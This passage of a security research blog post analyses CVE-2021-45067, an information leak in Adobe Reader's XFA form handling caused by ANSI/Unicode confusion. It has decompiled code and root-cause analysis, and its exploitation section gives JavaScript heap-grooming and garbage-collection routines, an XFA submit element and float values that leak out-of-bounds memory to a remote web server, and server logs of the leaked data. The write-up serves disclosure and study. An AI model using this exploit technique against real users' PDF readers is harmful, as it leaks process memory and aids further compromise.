+  __int64 v23; // rax
+  __int64 v24; // r14
+  int Len; // eax
+  _BYTE *Bytes; // rax
+  int v27; // edx
+  unsigned int v28; // eax
+  __int64 v29; // rdx
+  __int16 v30; // cx
+  __int16 v31; // ax
+  __int64 v32; // rdx
+  __int64 v33; // rax
+  __int64 v34; // rdx
+  __int16 v35; // cx
+  int v36; // edx
+  int v37; // [rsp+20h] [rbp-40h]
+  __int128 v38; // [rsp+38h] [rbp-28h] BYREF
+  __int128 v39; // [rsp+48h] [rbp-18h] BYREF
+
+  v10 = 0i64;
+  v11 = a6;
+  *a6 = 1;
+  ret = (*(__int64 (__fastcall **)(__int64))(gCosHFT + 16))(a4); // a4 - seems like some encoding type
+                                                                 // returns 4
+  switch ( ret )
+  {
+    case 5:
+    case 8:
+      v21 = EStrNewFromCosObjImpl(a4);
+      v22 = (int *)v21;
+      if ( *(_WORD *)(a2 + 34) )
+      {
+        v23 = ConvertDateValueToCanonical(this, v21);
+        v24 = v23;
+        if ( v23 )
+        {
+          Len = EStrGetLen(v23);
+          v10 = (char *)ASSureMalloc(Len + 1);
+          Bytes = (_BYTE *)EStrGetBytes(v24);
+          if ( Bytes && *Bytes == 0xFE && Bytes[1] == 0xFF )
+            miUCSStrcpy_safe(v10, 0x7FFFFFFFui64, (__int64)Bytes, 0i64);
+          else
+            ASstrcpy_safe(v10, 0x7FFFFFFFi64, (__int64)Bytes, 0i64);
+          EStrDelete(v24);
+LABEL_37:
+          if ( v22 )
+            EStrDelete((__int64)v22);
+          goto LABEL_39;
+        }
+      }
+      v38 = 0i64;
+      *(_QWORD *)&v38 = sub_209E23D8(v22);
+      v39 = 0i64;
+      v28 = CASText::len(0i64, v27);
+      CASText::CASText((__int64 *)&v39, (char (*)[8])"\r\n", 0, v28);
+      (*(void (__fastcall **)(_QWORD, const char *, _QWORD))(gASExtraHFT + 320))(v38, "\r", v39);
+      CASText::~CASText((__int64 *)&v39, v29);
+      v30 = utf_8_K;
+      if ( utf_8_K == -1 )
+        v30 = CLazyAtom::operator unsigned short((__int64)&utf_8_K);
+      v31 = *(_WORD *)(a2 + 68);
+      if ( v31 == v30 )
+      {
+        v32 = 2i64;
+      }
+      else
+      {
+        v35 = utf_16_K;
+        if ( utf_16_K == -1 )
+        {
+          v35 = CLazyAtom::operator unsigned short((__int64)&utf_16_K);
+          v31 = *(_WORD *)(a2 + 68);
+        }
+        if ( v31 != v35 )
+        {
+          v36 = *(_DWORD *)(a2 + 64);
+          if ( v36 == -1 || v36 == 32 )
+            v33 = (*(__int64 (__fastcall **)(_QWORD, _WORD **))(gASExtraHFT + 216))(v38, &a6);
+          else
+            v33 = (*(__int64 (__fastcall **)(_QWORD))(gASExtraHFT + 208))(v38);
+          goto LABEL_36;
+        }
+        v32 = 0i64;
+      }
+      v33 = (*(__int64 (__fastcall **)(_QWORD, __int64))(gASExtraHFT + 176))(v38, v32);
+LABEL_36:
+      v10 = (char *)v33;
+      CASText::~CASText((__int64 *)&v38, v34);
+      goto LABEL_37;
+    case 4:
+      v13 = gCoreHFT;
+      v14 = (*(__int64 (__fastcall **)(__int64))(gCosHFT + 152))(a4);         // calls a function in Acrobat returns 1593
+      srcBuff = (_BYTE *)(*(__int64 (__fastcall **)(_QWORD))(v13 + 56))(v14); // returns source buffer
+      v16 = ASstrnlen_safe(srcBuff, 0x7FFFFFFFui64, 0i64);
+      dst = (char *)ASSureMalloc(v16 + 1);                                    // memory is allocated here
+      v10 = dst;
+      if ( srcBuff && *srcBuff == 0xFE && srcBuff[1] == 0xFF )
+        miUCSStrcpy_safe(dst, 0x7FFFFFFFui64, (__int64)srcBuff, 0i64);
+      else
+        ASstrcpy_safe(dst, 0x7FFFFFFFi64, (__int64)srcBuff, 0i64);            // string is written here
+      goto LABEL_39;
+    case 7:
+      v18 = (*(__int64 (__fastcall **)(__int64))(gCosHFT + 232))(a4);
+      if ( v18 > 0 )
+      {
+        do
+        {
+          v19 = (*(__int64 (__fastcall **)(__int64, _QWORD))(gCosHFT + 200))(a4, (unsigned int)v10);
+          LOWORD(v37) = 0;
+          callback(this, a2, somExpression, v19, v37);
+          LODWORD(v10) = (_DWORD)v10 + 1;
+        }
+        while ( (int)v10 < v18 );
+      }
+      return 0i64;
+  }
+  if ( ret )
+    return 0i64;
+LABEL_39:
+  *v11 = 0;
+  return v10;
+}
+```
+
+In the above function, we execute the `case 4` block where `ASstrnlen_safe` is used to calculate the length of the `ANSI` string. `ASSureMalloc` is responsible for allocating a new buffer and `ASstrcpy_safe` is used to copy the string to the newly allocated buffer.
+
+**Till now everything is `ANSI`, then why this bug occurred?**
+
+Let's see the relevant part of the code which caused the crash.
+
+```c
+if (newStrBuff) {
+    textEncoding_1 = utf_16_K;
+    if (utf_16_K == -1)
+        textEncoding_1 = CLazyAtom::operator unsigned short((__int64) & utf_16_K);
+    lnewStrBuff = newStrBuff;
+    if (*(_WORD*)(someStackBuff + 68) == textEncoding_1) {
+        for (j = 0;; j += 2) {              // miUCSStrlen_safe
+            currentCharVal = *lnewStrBuff;  // crashes here. this is trying to find the length of UTF-16 string
+                                            // but the actual allocated string is UTF-8
+            nextChar = lnewStrBuff + 1;
+            nextCharVal = *nextChar;
+            lnewStrBuff = nextChar + 1;
+            if (!currentCharVal && !nextCharVal)
+                break;
+        }
+        newStrLength = j;
+    } else {
+        newStrLength = ASstrnlen_safe(newStrBuff, 0x7FFFFFFF ui64, 0 i64);
+    }
+    maxNewStrLength = url_encode( *
+        (_QWORD * )(someStackBuff + 40),
+        (__int64) outputBuffer,
+        maxNewStrLength,
+        (unsigned __int8 * ) newStrBuff,
+        newStrLength); // this OOB data is leaked to remote server
+}
+```
+
+The crash occurred while calculating the **length** of the newly allocated buffer, in this line `currentCharVal = *lnewStrBuff;`.
+
+We can see that if the new string buffer was allocated successfully, then it's going to check the `textEncoding` of the field being converted. If the `textEncoding` is `utf_16_K` then it's going to call `miUCSStrlen_safe` (inlined in this case) or else `ASstrnlen_safe`.
+
+The question is when everything was done as `ANSI`, then why the code treated the `ANSI` buffer as `Unicode`?
+
+The answer is in the **XFA XDP** packet.
+
+```xml
+<submit format="formdata" target="http://example.com/" textEncoding="UTF-16"></submit>
+```
+
+Here, `textEncoding` is set to `UTF-16` and, when the **form** is submitted, a `POST` request is sent to the `target` URL with data in the below-given format.
+
+```bash
+$ sudo python3 web-server-post.py -i 0.0.0.0 -p 80
+Web server listening on 0.0.0.0:80
+
+subform0[0].#field[0]=1,872,560,676,325,559
+```
+
+The below given is a partially symbolized stack trace that makes more sense now. Now, we better understand what the bug is and why it's caused.
+
+```
+0:000> kc
+ # Call Site
+00 AcroForm!crash_sub_20A49980
+01 AcroForm!sub_20A41150
+02 AcroForm!sub_20ABF354
+03 AcroForm!ExportAsHtml
+04 AcroForm!AFSubmitIt
+05 AcroForm!sub_20C09860
+06 AcroForm!SubmitDispatcher__dispatch
+07 AcroForm!sub_2100B170
+08 AcroForm!XFAEventManager__eventOccurred
+09 AcroForm!XFAFormModelImpl__execEvent
+0a AcroForm!XFAFormModelImpl__eventOccurred
+0b AcroForm!XFAFormModelImpl__eventOccurred_0
+0c AcroForm!piDocumentContext__eventOccurred
+0d AcroForm!sub_20B7B1F8
+0e AcroForm!sub_20B7B1C0
+0f Acrobat!AIDE::PixelPartInfo::PixelPartInfo
+```
+
+In short, the vulnerable code is **missing proper validation** of the **input string type** before **trusting** `textEncoding`.
+
+## Exploitation
+
+**Can we exploit this vulnerability? It's pretty easy to exploit this bug.**
+
+The exploitation involves the following steps:
+
+- Figure out if we can control the float string size
+- Groom the LFH bucket of the target size
+- Trigger the vulnerability and leak data to the remote server
+
+### Control String Length
+
+First thing while writing the exploit was to figure out the allocation size that is not triggered frequently by **Adobe Reader**.
+
+One of the string sizes I settled for this exploit was `0x58`. This is a good size as it's not frequently allocated and freed in the background. This size also aligns the **heap chunk** perfectly so that there is only **one** **NULL** byte at the end.
+
+This can be achieved by below given XFA `<float>` value:
+
+```xml
+<float> 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111.1 </float>
+```
+
+> Note: `1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111.11` is represented as `111111111111111108135579683325721145151278646022500260507995217127497448141778097012736` in string.
+
+### Groom LFH
+
+Grooming the LFH bucket of size `0x58` is as easy as allocating strings of the target length. Below given javascript can help to achieve the same:
+
+```js
+const groomLFH = (size, count) => {
+    var string = unescape("%u4142").repeat(size);
+
+    for (var i = 0; i < count; i++) {
+        chunks.push(string.substr(0, (size - 2) / 2).toUpperCase());
+    }
+
+    for (var i = 0; i < chunks.length; i += 4) {
+        chunks[i] = null;
+        delete chunks[i];
+    }
+};
+```
+
+Now to make the holes we need to trigger **Garbage Collection**. Below given javascript can help to achieve the same:
+
+```js
+const triggerGC = () => {
+    let count = 0x100000;
+    var string = "GC".repeat(count);
+
+    for (var i = 0; i < 1000; i++) {
+        string.substr(0, count);
+    }
+};
+```
+
+### Vulnerability Trigger
+
+**How do we reliably trigger the information leak?**
+
+We have only one `<float>` string value and, `LFH` randomization makes it harder to **re-allocate** the holes efficiently.
+
+One solution that turned out to be effective was to add multiple `<float>` fields to the **XDP** packet. It helped to increase the reliability of the reallocation of the holes.
+
+Finally, when the user **clicks** on the field, the **form** is submitted. If the **leak** is successful, then anything after `111111111111111108135579683325721145151278646022500260507995217127497448141778097012736` is **out-of-bounds** data, if it's not another **SOM** expression.
+
+For this exploit, I choose to use this pattern:
+
+```
+BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA
+```
+
+If in the web server logs, you see the above pattern then the leak was successful. If we see any **non-printable** data, it's also **out-of-bounds** data. Let's have a look at the web server logs:
+
+```bash
+$ sudo python3 web-server-post.py -i 0.0.0.0 -p 80
+Web server listening on 0.0.0.0:80
+
+subform0[0].#field[0]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736\�����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[10]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[11]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[12]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[13]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[14]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736$����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[15]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[16]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[17]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736$����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[18]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[19]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[1]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[20]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736\�����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[21]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[22]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[23]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[24]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[25]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[26]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736$����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[27]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[28]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[29]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[2]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[30]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[31]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[32]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[33]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736$����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[34]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[35]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736�A���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[36]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[37]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[38]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[39]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[3]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736�A���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[4]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[5]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[6]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736悵���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[7]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736\�����BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[8]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736@�ߞ��BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA&subform0[0].#field[9]=111111111111111108135579683325721145151278646022500260507995217127497448141778097012736��/���BABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABABA
+192.168.0.110 - - [05/Oct/2021 14:12:12] "POST / HTTP/1.1" 200 -
+```
+
+We can see that **out-of-bounds** data is leaked successfully.
+
+> Note: In the exploit, please change the url `target="http://192.168.0.110/"` to reflect the remote server IP address.
+
+## Exploit Repository
+
+<https://github.com/hacksysteam/CVE-2021-45067>
+
+## Demo Video
+
+<https://www.youtube.com/embed/2QNmhwN_I4w>
+b:[["$","div",null,{"className":"-mt-6","children":["$","$L18",null,{"className":"mb-8","children":["$","h1",null,{"className":"text-3xl md:text-4xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent","children":"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067"}]}]}],["$","$L19",null,{"slug":"adobe-reader-xfa-ansi-unicode-confusion-information-leak","frontmatter":{"title":"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067","date":"October 12, 2022","authors":["Ashfaq Ansari","Krishnakant Patil"],"excerpt":"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)","tags":["adobe","Adobe Reader","XFA","ANSI-Unicode Confusion","Information Disclosure","information leak","out-of-bounds read","CVE-2021-45067"]},"content":"$1a","tocItems":[{"id":"overview","text":"Overview","depth":2},{"id":"background","text":"Background","depth":2},{"id":"advisory","text":"Advisory","depth":2},{"id":"testbed","text":"Testbed","depth":2},{"id":"proof-of-concept","text":"Proof of Concept","depth":2},{"id":"crash-state","text":"Crash State","depth":2},{"id":"heap-operation","text":"Heap Operation","depth":2},{"id":"disassembly-around-crash","text":"Disassembly Around Crash","depth":2},{"id":"module-version","text":"Module Version","depth":2},{"id":"root-cause-analysis","text":"Root Cause Analysis","depth":2},{"id":"exploitation","text":"Exploitation","depth":2},{"id":"control-string-length","text":"Control String Length","depth":3},{"id":"groom-lfh","text":"Groom LFH","depth":3},{"id":"vulnerability-trigger","text":"Vulnerability Trigger","depth":3},{"id":"exploit-repository","text":"Exploit Repository","depth":2},{"id":"demo-video","text":"Demo Video","depth":2}]}]]
+10:null
+14:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}]]
+f:null
+17:{"metadata":[["$","title","0",{"children":"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067 | HackSys Inc Blog"}],["$","meta","1",{"name":"description","content":"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)"}],["$","link","2",{"rel":"manifest","href":"/manifest.webmanifest","crossOrigin":"$undefined"}],["$","meta","3",{"name":"keywords","content":"adobe, Adobe Reader, XFA, ANSI-Unicode Confusion, Information Disclosure, information leak, out-of-bounds read, CVE-2021-45067"}],["$","meta","4",{"name":"script:ld+json","content":"{\"@context\":\"https://schema.org\",\"@type\":\"Article\",\"headline\":\"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067\",\"datePublished\":\"2022-10-12T00:00:00.000Z\",\"author\":{\"@type\":\"Person\",\"name\":\"Ashfaq Ansari\"},\"description\":\"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)\",\"publisher\":{\"@type\":\"Organization\",\"name\":\"HackSys Inc\",\"logo\":{\"@type\":\"ImageObject\",\"url\":\"https://hacksys.io/logo.svg\"}},\"url\":\"https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak\",\"mainEntityOfPage\":{\"@type\":\"WebPage\",\"@id\":\"https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak\"}}"}],["$","link","5",{"rel":"canonical","href":"https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak"}],["$","meta","6",{"property":"og:title","content":"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067"}],["$","meta","7",{"property":"og:description","content":"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)"}],["$","meta","8",{"property":"og:url","content":"https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak"}],["$","meta","9",{"property":"og:type","content":"article"}],["$","meta","10",{"property":"article:published_time","content":"2022-10-12T00:00:00.000Z"}],["$","meta","11",{"property":"article:author","content":"Ashfaq Ansari"}],["$","meta","12",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","13",{"name":"twitter:title","content":"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067"}],["$","meta","14",{"name":"twitter:description","content":"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)"}]],"error":null,"digest":"$undefined"}
+12:{"metadata":"$17:metadata","error":null,"digest":"$undefined"}
